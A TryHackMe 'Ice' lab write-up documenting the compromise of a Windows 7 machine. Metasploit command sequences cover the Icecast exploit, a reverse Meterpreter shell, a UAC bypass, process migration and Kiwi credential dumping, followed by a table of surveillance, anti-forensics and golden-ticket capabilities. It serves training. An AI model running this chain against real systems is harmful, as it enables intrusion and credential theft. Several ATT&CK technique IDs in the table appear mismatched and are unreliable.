# 🚩 TryHackMe Writeup: Ice

**Date:** 2026-02-15  
**Target:** Windows 7 (DARK-PC)  
**Vulnerability:** CVE-2004-1561 (Icecast Header Overwrite)  
**Focus:** Exploit Chain, Privilege Escalation (UAC Bypass), and Post-Exploitation (Kiwi/Mimikatz)

---

## 1. Executive Summary

Successfully compromised the "Ice" target machine by exploiting a vulnerable media server application (Icecast) to gain initial access. From there, I utilized a UAC bypass module to elevate privileges, migrated to a stable SYSTEM-level process, and dumped cleartext credentials using Kiwi (Mimikatz).

The engagement concluded with a review of advanced post-exploitation persistence and forensic evasion techniques.

---

## 2. Reconnaissance

The engagement began with an Nmap scan over the OpenVPN connection to identify exposed services.

### Command

```bash
nmap -sS -p- 10.81.x.x
```
## Findings

- **Port 3389/tcp** — RDP open  
- **Port 8000/tcp** — Running Icecast streaming media server  
- **Hostname** — DARK-PC  

---

## 3. Initial Access (Exploitation)

Researching the Icecast service revealed it is vulnerable to a buffer overflow.

- **CVE:** CVE-2004-1561  
- **CVSS Impact Score:** 6.4  

I launched the Metasploit Framework to weaponize this vulnerability.

### Exploitation

```bash
msfconsole
use exploit/windows/http/icecast_header
set RHOSTS 10.81.x.x
set LHOST tun0
run
```
### Result

Initial reverse shell (**Meterpreter**) established under the context of the user **Dark**.

---

## 4. Privilege Escalation

Running `sysinfo` revealed the target was running:

- **Windows 7 x64 (Build 7601)**

As the user **Dark**, I lacked administrative privileges.

---

### 4.1 Vulnerability Discovery

Backgrounded the session and ran the Local Exploit Suggester:

```bash
run post/multi/recon/local_exploit_suggester
```
### 4.2 Exploitation (UAC Bypass)

The suggester recommended a User Account Control (UAC) bypass via the Event Viewer.

```bash
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set LHOST tun0
run
```
### 4.3 Verification

```bash
getprivs
```
Confirmed expanded permissions, including:

- `SeTakeOwnershipPrivilege`

---

## 5. Looting & Credential Extraction

To interact with `lsass.exe` and dump credentials, the payload needed to:

- Be inside a **64-bit process**
- Run as **NT AUTHORITY\SYSTEM**

---

### 5.1 Process Migration

Identified the Printer Spooler service (`spoolsv.exe`) as a stable SYSTEM-level target.

```bash
ps
migrate -N spoolsv.exe
getuid
```
### Result

Successfully migrated to:

```bash
NT AUTHORITY\SYSTEM
```
### 5.2 Credential Dumping (Kiwi)

Loaded the modern version of Mimikatz (Kiwi) into the Meterpreter session:

```bash
load kiwi
creds_all
```
### Result

Recovered the cleartext password for user **Dark**:

```bash
Password01
```
## 6. Post-Exploitation Arsenal

Explored advanced Meterpreter modules for maintaining access, gathering intelligence, and manipulating the host.

| Command | Capability / Impact | MITRE ATT&CK Technique |
|----------|----------------------|----------------------|
| `hashdump` | Extracts the SAM database containing all local password hashes | **T1003** – Credential Dumping |
| `screenshare` | Real-time surveillance of the remote user's desktop | **T1123** – Audio Capture / **T1510** – Screen Capture |
| `record_mic` | Records ambient room audio via attached microphone | **T1123** – Audio Capture |
| `timestomp` | Modifies file timestamps (Anti-Forensics) | **T1070.006** – Indicator Removal on Host: Timestomping |
| `golden_ticket_create` | Forges Kerberos Ticket Granting Ticket (TGT) for persistent domain authentication | **T1098.003** – Account Manipulation: Golden Ticket |

---

## 🧠 Key Takeaway

Process migration is a **critical step in post-exploitation**.

Even with an elevated shell, interacting with core Windows authentication mechanisms (like **LSASS**) requires your payload to:

- Match system architecture (**x64**)
- Run with **SYSTEM-level authority**
- Reside inside a stable process (e.g., `spoolsv.exe`)

Without proper migration, credential dumping and advanced privilege manipulation may fail.